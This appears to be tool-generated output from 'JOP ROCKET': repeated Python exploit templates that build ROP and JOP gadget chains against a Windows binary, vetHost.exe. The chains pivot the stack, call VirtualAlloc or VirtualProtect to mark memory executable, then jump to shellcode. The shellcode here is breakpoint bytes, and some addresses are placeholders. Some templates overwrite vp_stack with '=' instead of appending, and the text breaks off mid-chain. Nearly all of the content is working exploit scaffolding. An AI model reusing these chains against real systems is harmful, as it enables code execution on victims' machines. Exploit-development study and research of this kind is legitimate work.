vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call ESI #1


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11011a32, # (base + 0x11a32), # pop esi # ret  # vetHost.exe   Load ESI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call ESI #2


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11011a32, # (base + 0x11a32), # pop esi # ret  # vetHost.exe   Load ESI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100318b, # (base + 0x318b), # add esp, 0x24 # xor eax, eax # pop edi # jmp esi # vetHost.exe  [0x28 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100318b, # (base + 0x318b), # add esp, 0x24 # xor eax, eax # pop edi # jmp esi # vetHost.exe  [0x28 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes] 0x8c
		# N----> STACK PIVOT TOTAL: 0x8c bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call ESI #3


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11011a32, # (base + 0x11a32), # pop esi # ret  # vetHost.exe   Load ESI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003182, # (base + 0x3182), # add esp, 0x14 # or eax, 0xffffffff # pop edi # jmp esi # vetHost.exe  [0x18 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003182, # (base + 0x3182), # add esp, 0x14 # or eax, 0xffffffff # pop edi # jmp esi # vetHost.exe  [0x18 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003182, # (base + 0x3182), # add esp, 0x14 # or eax, 0xffffffff # pop edi # jmp esi # vetHost.exe  [0x18 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003182, # (base + 0x3182), # add esp, 0x14 # or eax, 0xffffffff # pop edi # jmp esi # vetHost.exe  [0x18 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes] 0x9c
		# N----> STACK PIVOT TOTAL: 0x9c bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call ESI #4


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11011a32, # (base + 0x11a32), # pop esi # ret  # vetHost.exe   Load ESI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x14
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x64
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes] 0xa0
		# N----> STACK PIVOT TOTAL: 0xa0 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call ESI #5


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11011a32, # (base + 0x11a32), # pop esi # ret  # vetHost.exe   Load ESI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes] 0xac
		# N----> STACK PIVOT TOTAL: 0xac bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.



* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EAX #1


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe   Load EAX with address for dispatcher gadget!
		0x1100255a, # (base + 0x255a) # add ebx, esi # jmp dword ptr [ebx] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with -4 bytes between dispatch table slots!
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe Load EBX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x10
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x20
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x30
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x40
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x50
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x60
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x70
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes] 0x7c
		# N----> STACK PIVOT TOTAL: 0x7c bytes
			# padding  (-0x4 bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe # Set up pop for VP 		# Need 16 bytes filler, for what was done after pop ebx
			# padding  (-0x4 bytes)
		0x1100255c, # (base + 0x255c), # jmp dword ptr [ebx] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EAX #2


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe   Load EAX with address for dispatcher gadget!
		0x1100255a, # (base + 0x255a) # add ebx, esi # jmp dword ptr [ebx] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with -4 bytes between dispatch table slots!
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe Load EBX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0xc
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x18
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x24
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x30
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x3c
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x48
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x54
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x60
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x6c
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes] 0x7c
		# N----> STACK PIVOT TOTAL: 0x7c bytes
			# padding  (-0x4 bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe # Set up pop for VP 		# Need 16 bytes filler, for what was done after pop ebx
			# padding  (-0x4 bytes)
		0x1100255c, # (base + 0x255c), # jmp dword ptr [ebx] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EAX #3


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe   Load EAX with address for dispatcher gadget!
		0x1100255a, # (base + 0x255a) # add ebx, esi # jmp dword ptr [ebx] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with -4 bytes between dispatch table slots!
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe Load EBX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0xc
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x18
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x24
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x30
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x3c
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x48
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x54
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x60
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x6c
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
			# padding  (-0x4 bytes)
